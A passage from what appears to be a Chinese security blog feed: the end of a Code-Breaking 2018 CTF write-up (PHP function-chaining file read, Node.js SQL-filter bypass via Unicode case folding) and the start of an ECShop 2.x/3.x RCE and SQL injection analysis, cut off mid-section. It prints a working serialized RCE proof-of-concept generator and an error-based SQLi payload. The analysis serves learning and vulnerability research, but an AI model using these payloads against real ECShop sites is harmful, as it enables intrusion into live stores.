<li>&#x6CD5;&#x56DB;&#xFF1A; &#x5404;&#x79CD;&#x51FD;&#x6570;&#x5D4C;&#x5957;</li>
</ul>
<p><code>readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></p>
<p>&#x51FD;&#x6570;&#x89E3;&#x91CA;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">getchwd() &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x3002;</span><br><span class="line">scandir() &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x6307;&#x5B9A;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x548C;&#x76EE;&#x5F55;&#x7684;&#x6570;&#x7EC4;&#x3002;</span><br><span class="line">dirname() &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x8DEF;&#x5F84;&#x4E2D;&#x7684;&#x76EE;&#x5F55;&#x90E8;&#x5206;&#x3002;</span><br><span class="line">chdir() &#x51FD;&#x6570;&#x6539;&#x53D8;&#x5F53;&#x524D;&#x7684;&#x76EE;&#x5F55;&#x3002;</span><br><span class="line"></span><br><span class="line">readfile()  &#x8F93;&#x51FA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;</span><br><span class="line"></span><br><span class="line">current()       &#x8FD4;&#x56DE;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x5F53;&#x524D;&#x5355;&#x5143;, &#x9ED8;&#x8BA4;&#x53D6;&#x7B2C;&#x4E00;&#x4E2A;&#x503C;</span><br><span class="line">pos()           current() &#x7684;&#x522B;&#x540D;</span><br><span class="line">next() &#x51FD;&#x6570;&#x5C06;&#x5185;&#x90E8;&#x6307;&#x9488;&#x6307;&#x5411;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF0C;&#x5E76;&#x8F93;&#x51FA;&#x3002;</span><br><span class="line">end()       &#x5C06;&#x5185;&#x90E8;&#x6307;&#x9488;&#x6307;&#x5411;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#xFF0C;&#x5E76;&#x8F93;&#x51FA;&#x3002;</span><br><span class="line">array_rand()    &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x968F;&#x673A;&#x952E;&#x540D;&#xFF0C;&#x6216;&#x8005;&#x5982;&#x679C;&#x60A8;&#x89C4;&#x5B9A;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x4E0D;&#x53EA;&#x4E00;&#x4E2A;&#x952E;&#x540D;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;&#x5305;&#x542B;&#x968F;&#x673A;&#x952E;&#x540D;&#x7684;&#x6570;&#x7EC4;&#x3002;</span><br><span class="line">array_flip()    array_flip() &#x51FD;&#x6570;&#x7528;&#x4E8E;&#x53CD;&#x8F6C;/&#x4EA4;&#x6362;&#x6570;&#x7EC4;&#x4E2D;&#x6240;&#x6709;&#x7684;&#x952E;&#x540D;&#x4EE5;&#x53CA;&#x5B83;&#x4EEC;&#x5173;&#x8054;&#x7684;&#x952E;&#x503C;&#x3002;</span><br><span class="line"></span><br><span class="line">chr() &#x51FD;&#x6570;&#x4ECE;&#x6307;&#x5B9A;&#x7684; ASCII &#x503C;&#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x3002;</span><br><span class="line">hex2bin &#x2014; &#x8F6C;&#x6362;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x4E3A;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;</span><br><span class="line"></span><br><span class="line">getenv()        &#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x7684;&#x503C;(&#x5728;<span class="hljs-number">7.1</span>&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x4E0D;&#x7ED9;&#x4E88;&#x53C2;&#x6570;)</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="easy-nodechr"><a href="#easy-nodechr" class="headerlink" title="easy - nodechr"></a>easy - nodechr</h2><p>&#x6E90;&#x7801;&#x5728; <code>/source</code> &#xFF0C;node.js &#x7684;&#x9898;&#x76EE;</p>
<p>&#x6CA1;&#x6709;&#x6DF1;&#x5165;&#x5B66;&#x4E60;&#x8FC7; node.js &#x4F46;&#x662F;&#x4EE3;&#x7801;&#x597D;&#x6B79;&#x8FD8;&#x662F;&#x901A;&#x4FD7;&#x6613;&#x61C2;</p>
<p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params">ctx, next</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span>(ctx.method == <span class="hljs-string">&apos;POST&apos;</span>) {</span><br><span class="line">        <span class="hljs-keyword">let</span> username = safeKeyword(ctx.request.body[<span class="hljs-string">&apos;username&apos;</span>])</span><br><span class="line">        <span class="hljs-keyword">let</span> password = safeKeyword(ctx.request.body[<span class="hljs-string">&apos;password&apos;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">let</span> jump = ctx.router.url(<span class="hljs-string">&apos;login&apos;</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> (username &amp;&amp; password) {</span><br><span class="line">            <span class="hljs-keyword">let</span> user = <span class="hljs-keyword">await</span> ctx.db.get(<span class="hljs-string">`SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; = &apos;<span class="hljs-subst">${username.toUpperCase()}</span>&apos; AND &quot;password&quot; = &apos;<span class="hljs-subst">${password.toUpperCase()}</span>&apos;`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> (user) {</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="hljs-string">&apos;admin&apos;</span>)</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x76F4;&#x63A5;&#x5B9A;&#x4F4D; sql&#x8BED;&#x53E5;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#xFF0C;<code>username</code> &#x548C; <code>password</code> &#x5728;&#x63D2;&#x5165;&#x6570;&#x636E;&#x5E93;&#x6267;&#x884C;&#x4E4B;&#x524D;&#x7ECF;&#x8FC7;&#x4E00;&#x4E2A;  <code>safeKeyword</code> &#x51FD;&#x6570;&#x5904;&#x7406;&#x3002;&#x8DDF;&#x8FDB;&#x51FD;&#x6570;&#x5B9A;&#x4E49;</p>
<p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeKeyword</span>(<span class="hljs-params">keyword</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="hljs-regexp">/(union|select|;|\-\-)/i</span>s)) {</span><br><span class="line">        <span class="hljs-keyword">return</span> keyword</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x51FD;&#x6570;&#x8FC7;&#x6EE4;&#x4E86; <code>union</code> &#x3001; <code>select</code> &#x3001;<code>;</code> &#x3001;<code>--</code>&#x3002;</p>
<p>&#x76F8;&#x5E94;&#x7684; trick &#x5728; p&#x725B; &#x7684;blog <a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">Fuzz&#x4E2D;&#x7684;javascript&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027;</a></p>
<p><img src="/2019/12/28/Code-Breaking-Puzzles-2018/zJ5ws9f8q7F2GOp.jpg" alt></p>
<p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-string">&quot;un&#x131;on&quot;</span>.toUpperCase() == <span class="hljs-string">&quot;UNION&quot;</span></span><br><span class="line"><span class="hljs-string">&quot;&#x17F;elect&quot;</span>.toUpperCase() == <span class="hljs-string">&quot;SELECT&quot;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2019/12/28/Code-Breaking-Puzzles-2018/FJ69mtCpvdrAWSQ.jpg" alt></p>
<p>&#x53C2;&#x8003;&#x6587;&#x7AE0;</p>
<blockquote>
<p><a href="https://skysec.top/" target="_blank" rel="noopener">https://skysec.top/</a><br><a href="https://xz.aliyun.com/t/3623" target="_blank" rel="noopener">https://xz.aliyun.com/t/3623</a></p>
</blockquote>
</body></html>]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Node.js</tag>
        <tag>Java</tag>
        <tag>Python</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>ECShop 3.6.x RCE 到 4.0 SQLi 漏洞分析</title>
    <url>/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<html><head></head><body><p>&#x4E00;&#x4E2A;&#x4ECE; Nday &#x5230; 0day &#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x5BF9;&#x6B64;&#x8FDB;&#x884C;&#x590D;&#x73B0;&#x5206;&#x6790;&#x548C;&#x5B66;&#x4E60;</p>
<a id="more"></a>

<p>&#x4E24;&#x5E74;&#x524D;&#x4E00;&#x4E2A;&#x5229;&#x7528;&#x5F88;&#x5DE7;&#x5999;&#x7684;&#x5168;&#x7248;&#x672C;&#x7684; RCE &#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x8FD1;&#x65E5;&#x7B14;&#x8005;&#x53C8;&#x770B;&#x5230;&#x4E86; 4.0 &#x7248;&#x672C;&#x7684; SQL &#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x5206;&#x6790;&#x3002;&#x5E0C;&#x671B;&#x80FD;&#x4ECE;&#x590D;&#x73B0;&#x5206;&#x6790;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x83B7;&#x5F97;&#x4E00;&#x70B9;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x7684;&#x601D;&#x8DEF;&#x548C;&#x542F;&#x793A;&#x3002;</p>
<h1 id="3-6-x-RCE"><a href="#3-6-x-RCE" class="headerlink" title="3.6.x RCE"></a>3.6.x RCE</h1><h2 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"><a href="#&#x6F0F;&#x6D1E;&#x590D;&#x73B0;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h2><p>Vulhub&#x4E0A;&#x5DF2;&#x7ECF;&#x6709;&#x73B0;&#x6210;&#x7684;&#x5229;&#x7528;&#x811A;&#x672C;</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$shell = bin2hex(<span class="hljs-string">&quot;{\$asd&apos;];phpinfo\t();//}xxx&quot;</span>);</span><br><span class="line">$id = <span class="hljs-string">&quot;-1&apos; UNION/*&quot;</span>;</span><br><span class="line">$arr = [</span><br><span class="line">    &quot;num&quot; =&gt; sprintf(&apos;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&apos;, bin2hex($id), $shell),</span><br><span class="line">    &quot;id&quot; =&gt; $id</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$s = serialize($arr);</span><br><span class="line"></span><br><span class="line">$hash3 = <span class="hljs-string">&apos;45ea207d7a2b68c49582d2d22adf953a&apos;</span>;</span><br><span class="line">$hash2 = <span class="hljs-string">&apos;554fcae493e564ee0dc75bdf2ebf94ca&apos;</span>;</span><br><span class="line"></span><br><span class="line">echo <span class="hljs-string">&quot;POC for ECShop 2.x: \n&quot;</span>;</span><br><span class="line">echo <span class="hljs-string">&quot;{$hash2}ads|{$s}{$hash2}&quot;</span>;</span><br><span class="line">echo <span class="hljs-string">&quot;\n\nPOC for ECShop 3.x: \n&quot;</span>;</span><br><span class="line">echo <span class="hljs-string">&quot;{$hash3}ads|{$s}{$hash3}&quot;</span>;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124175028636.png" alt="image-20201124175028636"></p>
<h2 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h2><h3 id="&#x89E6;&#x53D1;&#x6D41;&#x7A0B;"><a href="#&#x89E6;&#x53D1;&#x6D41;&#x7A0B;" class="headerlink" title="&#x89E6;&#x53D1;&#x6D41;&#x7A0B;"></a>&#x89E6;&#x53D1;&#x6D41;&#x7A0B;</h3><p>&#x5B9A;&#x4F4D;&#x89E6;&#x53D1;&#x70B9; <code>/user.php</code>&#xFF1A;</p>
<p>&#x5BF9; <code>$back_act</code> &#x9644;&#x503C;&#xFF0C; &#x5176;&#x5B9E;&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#x76F8;&#x5F53;&#x4E8E; <code>Referer</code>  &#x5B57;&#x6BB5;&#x4E0D;&#x5305;&#x542B; <code>user.php</code> &#x7684;&#x524D;&#x63D0;&#x4E0B;&#x80FD;&#x8FBE;&#x5230; <code>$back_act</code> &#x7684;&#x53D8;&#x91CF;&#x53EF;&#x63A7;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124175854342.png" alt="image-20201124175854342"></p>
<p>&#x53D8;&#x91CF;&#x4F20;&#x9012;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124183225043.png" alt="image-20201124183225043"></p>
<p>&#x8DDF;&#x8FDB;&#xFF0C;&#x8FD9;&#x91CC;&#x8FDB;&#x884C;&#x4E86;&#x53D8;&#x91CF;&#x6CE8;&#x518C;&#x3002;&#x5C06; <code>$back_act</code> &#x6CE8;&#x518C;&#x6210;&#x4E86; <code>$this-&gt;_var[$tpl_var]</code></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124183504327.png" alt="image-20201124183504327"></p>
<p>&#x4E0B;&#x9762;&#x8DDF;&#x8FDB; <code>display</code> &#xFF0C;<code>/includes/cls_template.php</code> &#x4E3A;&#x6A21;&#x7248;&#x7C7B;&#xFF0C; <code>display</code> &#x4E3A;&#x9875;&#x9762;&#x663E;&#x793A;&#x51FD;&#x6570;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124184751849.png" alt="image-20201124184751849"></p>
<p>&#x8DDF;&#x8FDB; <code>fetch</code>&#xFF0C;&#x4E3B;&#x8981;&#x4E3A;&#x6A21;&#x7248;&#x5904;&#x7406;&#x6587;&#x4EF6;&#x3002;&#x5904;&#x7406;&#x7684; <code>filename</code> &#x4E3A; <code>user_passport.dwt</code></p>
<p>&#x5176;&#x4E2D;&#x8FD9;&#x91CC;&#x4F1A;&#x89E6;&#x53D1;&#x7F16;&#x8BD1;&#x6A21;&#x7248;&#x51FD;&#x6570;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124185436789.png" alt="image-20201124185436789"></p>
<p>&#x8DDF;&#x8FDB;<code>make_compiled</code> , &#x4F1A;&#x8FD4;&#x56DE;&#x5904;&#x7406;&#x597D;&#x7684; hmtl &#x5185;&#x5BB9;&#x3002;&#x7136;&#x540E;&#x9644;&#x503C;&#x7ED9; <code>out</code></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124190021547.png" alt="image-20201124190021547"></p>
<p>&#x4E4B;&#x540E;&#x4F1A;&#x8FD4;&#x56DE; <code>display</code> &#x51FD;&#x6570;&#x7EE7;&#x7EED;&#x5904;&#x7406;&#x672A;&#x5904;&#x7406;&#x7684;&#x6D41;&#x7A0B;&#xFF0C;<code>strpos</code> &#x5224;&#x65AD;&#x8FD9;&#x91CC;&#x662F;&#x81F3;&#x5173;&#x91CD;&#x8981;&#x7684;&#x4E00;&#x70B9;&#xFF0C;&#x6D89;&#x53CA;&#x5230;&#x4E86;&#x4E4B;&#x540E;&#x9700;&#x8981;&#x8C03;&#x7528;&#x7684; <code>insert_mod</code> &#x3002;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124190519184.png" alt="image-20201124190519184"></p>
<p><code>$this-&gt;_echash</code> &#x662F;&#x4E4B;&#x524D; <code>/includes/cls_template.php</code> &#x5B9A;&#x4E49;&#x597D;&#x7684;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> $_echash        = <span class="hljs-string">&apos;45ea207d7a2b68c49582d2d22adf953a&apos;</span>;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x7136;&#x540E;&#x8FDB;&#x884C; <code>foreach</code> &#x5FAA;&#x73AF;&#x6267;&#x884C;  <code>insert_mod</code> </p>
<p>&#x8FD9;&#x91CC; <code>if (($key % 2) == 1)</code> &#x7684;&#x4F5C;&#x7528;&#x770B;&#x4E00;&#x4E0B;&#x88AB;&#x5207;&#x5272;&#x7684; <code>k</code> &#x5C31;&#x77E5;&#x9053;&#x4E86;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124191853741.png" alt="image-20201124191853741"></p>
<p>&#x8DDF;&#x8FDB;  <code>insert_mod</code>&#xFF0C; &#x4E3B;&#x8981;&#x5B8C;&#x6210;&#x8FD9;&#x51E0;&#x4EF6;&#x4E8B;&#x513F;&#xFF1A;</p>
<ol>
<li>&#x7528; <code>|</code> &#x5206;&#x5272;&#x53D8;&#x91CF;</li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316; <code>para</code></li>
<li><code>fun</code> &#x53D8;&#x91CF;&#x7684;&#x62FC;&#x63A5;</li>
<li>&#x8FD4;&#x56DE; <code>$fun($para)</code></li>
</ol>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124191423906.png" alt="image-20201124191423906"></p>
<p>&#x6839;&#x636E;&#x8FD4;&#x56DE;&#x503C;&#x5F15;&#x53D1;&#x601D;&#x8003;&#xFF0C; &#x6211;&#x4EEC;&#x76EE;&#x524D;&#x5F97;&#x5230;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x662F;&#xFF1A;<code>$fun($para)</code> </p>
<p><code>$fun($para)</code> &#x7684; <code>fun</code> &#x6765;&#x81EA; <code>insert_</code> + &#x88AB; explode &#x7684;&#x524D;&#x534A;&#x90E8;&#x5206;</p>
<p><code>para</code> &#x6765;&#x81EA;&#x88AB; explode &#x7684;&#x540E;&#x534A;&#x90E8;&#x5206;</p>
<p>&#x90A3;&#x4E48;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x601D;&#x8DEF;&#x5C31;&#x662F;&#x6267;&#x884C;&#x62FC;&#x63A5;&#x4E86;  <code>insert_</code>  &#x7684;&#x53EF;&#x63A7;&#x51FD;&#x6570;</p>
<h3 id="&#x95EE;&#x9898;&#x5256;&#x6790;"><a href="#&#x95EE;&#x9898;&#x5256;&#x6790;" class="headerlink" title="&#x95EE;&#x9898;&#x5256;&#x6790;"></a>&#x95EE;&#x9898;&#x5256;&#x6790;</h3><ul>
<li>&#x95EE;&#x9898;&#x4E00;</li>
</ul>
<p>&#x9996;&#x5148;&#x662F; <code>$back_act</code> &#x9644;&#x503C;&#x65B9;&#x5F0F;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x91C7;&#x7528; Referer &#x5934;&#x4F20;&#x5165;&#xFF1F;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124175854342.png" alt="image-20201124175854342"></p>
<p>&#x5176;&#x5B9E;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x5176;&#x4ED6;&#x9644;&#x503C;&#x65B9;&#x6CD5;&#xFF1A;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">emample:</span><br><span class="line">$back_act = <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&apos;back_act&apos;</span>]) ? trim($_POST[<span class="hljs-string">&apos;back_act&apos;</span>]) : <span class="hljs-string">&apos;&apos;</span>;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x7A76;&#x5176;&#x6838;&#x5FC3;&#x539F;&#x56E0;&#xFF1A;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125153706202.png" alt="image-20201125153706202"></p>
<p><code>/includes/init.php</code></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125154151298.png" alt="image-20201125154151298"></p>
<p><code>addslashes_deep</code></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125154200642.png" alt="image-20201125154200642"></p>
<hr>
<ul>
<li>&#x95EE;&#x9898;&#x4E8C;</li>
</ul>
<p>&#x4E3A;&#x4EC0;&#x4E48;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#xFF1F;</p>
<p><code>/includes/cls_template.php#insert_mod</code> &#x5148;&#x5206;&#x5272;&#xFF0C;&#x518D;&#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125192053092.png" alt="image-20201125192053092"></p>
<hr>
<ul>
<li>&#x95EE;&#x9898;&#x4E09;</li>
</ul>
<p>&#x5982;&#x4F55;bypass</p>
<p>&#x4E3B;&#x8981;&#x8FC7;&#x6EE4;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">smarty_prefilter_preCompile</span><span class="hljs-params">($source)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line"></span><br><span class="line">      &#xB7;&#xB7;&#xB7;</span><br><span class="line">        </span><br><span class="line">        $pattern = <span class="hljs-keyword">array</span>(</span><br><span class="line">            <span class="hljs-string">&apos;/&lt;!--[^&gt;|\n]*?({.+?})[^&lt;|{|\n]*?--&gt;/&apos;</span>, <span class="hljs-comment">// &#x66FF;&#x6362;smarty&#x6CE8;&#x91CA;</span></span><br><span class="line">            <span class="hljs-string">&apos;/&lt;!--[^&lt;|&gt;|{|\n]*?--&gt;/&apos;</span>,               <span class="hljs-comment">// &#x66FF;&#x6362;&#x4E0D;&#x6362;&#x884C;&#x7684;html&#x6CE8;&#x91CA;</span></span><br><span class="line">            <span class="hljs-string">&apos;/(href=[&quot;|\&apos;])\.\.\/(.*?)([&quot;|\&apos;])/i&apos;</span>,  <span class="hljs-comment">// &#x66FF;&#x6362;&#x76F8;&#x5BF9;&#x94FE;&#x63A5;</span></span><br><span class="line">            <span class="hljs-string">&apos;/((?:background|src)\s*=\s*[&quot;|\&apos;])(?:\.\/|\.\.\/)?(images\/.*?[&quot;|\&apos;])/is&apos;</span>, <span class="hljs-comment">// &#x5728;images&#x524D;&#x52A0;&#x4E0A; $tmp_dir</span></span><br><span class="line">            <span class="hljs-string">&apos;/((?:background|background-image):\s*?url\()(?:\.\/|\.\.\/)?(images\/)/is&apos;</span>, <span class="hljs-comment">// &#x5728;images&#x524D;&#x52A0;&#x4E0A; $tmp_dir</span></span><br><span class="line">            <span class="hljs-string">&apos;/([\&apos;|&quot;])\.\.\//is&apos;</span>, <span class="hljs-comment">// &#x4EE5;../&#x5F00;&#x5934;&#x7684;&#x8DEF;&#x5F84;&#x5168;&#x90E8;&#x4FEE;&#x6B63;&#x4E3A;&#x7A7A;</span></span><br><span class="line">            );</span><br><span class="line">        $replace = <span class="hljs-keyword">array</span>(</span><br><span class="line">            <span class="hljs-string">&apos;\1&apos;</span>,</span><br><span class="line">            <span class="hljs-string">&apos;&apos;</span>,</span><br><span class="line">            <span class="hljs-string">&apos;\1\2\3&apos;</span>,</span><br><span class="line">            <span class="hljs-string">&apos;\1&apos;</span> . $tmp_dir . <span class="hljs-string">&apos;\2&apos;</span>,</span><br><span class="line">            <span class="hljs-string">&apos;\1&apos;</span> . $tmp_dir . <span class="hljs-string">&apos;\2&apos;</span>,</span><br><span class="line">            <span class="hljs-string">&apos;\1&apos;</span></span><br><span class="line">            );</span><br><span class="line">        <span class="hljs-keyword">return</span> preg_replace($pattern, $replace, $source);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="SQLi&#xFF08;&#x4E91;&#x590D;&#x73B0;&#xFF09;"><a href="#SQLi&#xFF08;&#x4E91;&#x590D;&#x73B0;&#xFF09;" class="headerlink" title="SQLi&#xFF08;&#x4E91;&#x590D;&#x73B0;&#xFF09;"></a>SQLi&#xFF08;&#x4E91;&#x590D;&#x73B0;&#xFF09;</h3><p>3.x&#x7248;&#x672C;&#x5F15;&#x5165;&#x4E86; <code>/includes/safety.php</code> &#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x3002;&#x6240;&#x4EE5; 3.x &#x7248;&#x672C; &#x7406;&#x8BBA;&#x4E0A;&#x662F;&#x4E0D;&#x5B58;&#x5728; SQL &#x6CE8;&#x5165;&#x7684;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124221247588.png" alt="image-20201124221247588"></p>
<p>&#x4F46;&#x662F;&#x4E3A;&#x4E86;&#x5B66;&#x4E60;&#x601D;&#x8DEF;&#xFF0C;&#x8FD8;&#x662F;&#x4E91;&#x590D;&#x73B0;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A; 2.x &#x7248;&#x672C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x6F0F;&#x6D1E;&#x3002;</p>
<p>&#x4E4B;&#x524D;&#x5206;&#x6790;&#x5230;&#x5BFB;&#x627E;&#x53EF;&#x63A7;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x8C03;&#x7528;&#x3002;&#x7F51;&#x4E0A;&#x7528;&#x7684;&#x90FD;&#x662F; <code>insert_ads</code> &#x8FD9;&#x4E2A;&#x51FD;&#x6570;</p>
<p>&#x5173;&#x4E8E; SQL &#x6CE8;&#x5165;&#x7684;&#x5229;&#x7528;&#x601D;&#x8003;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#xFF1A;<a href="https://xz.aliyun.com/t/2725" target="_blank" rel="noopener">https://xz.aliyun.com/t/2725</a></p>
<p>&#x6CE8;&#x91CA;&#x6389;&#x4E86; waf &#x76F8;&#x5173;&#x7684;&#x51FD;&#x6570;&#xFF08;&#x7ED5;&#x4E0D;&#x8FC7;&#x53BB;&#xFF09;&#xFF0C;payload &#x5982;&#x4E0B;</p>
<p></p><figure class="highlight hljs"><table><tbody><tr><td class="code"><pre><span class="line">45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:&quot;num&quot;;s:3:&quot;669&quot;;s:2:&quot;id&quot;;s:57:&quot;1&apos; and updatexml(1,make_set(3,&apos;~&apos;,(select version())),1)#&quot;;}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6267;&#x884C;&#x7684;&#x76F8;&#x5E94; SQL &#x8BED;&#x53E5;&#xFF1A;</p>
